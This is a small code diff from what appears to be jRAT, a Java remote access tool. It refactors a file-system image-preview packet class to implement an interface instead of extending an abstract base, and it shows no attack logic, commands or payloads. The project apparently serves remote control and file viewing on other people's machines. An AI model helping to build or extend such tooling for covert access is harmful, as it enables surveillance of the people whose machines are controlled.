@@ -1,12 +1,12 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 import jrat.common.utils.ImageUtils;
 
 import java.awt.image.BufferedImage;
 
-public class Packet43PreviewImage extends AbstractOutgoingPacket {
+public class Packet43PreviewImage implements OutgoingPacket {
 
     private String path;
 	private BufferedImage image;
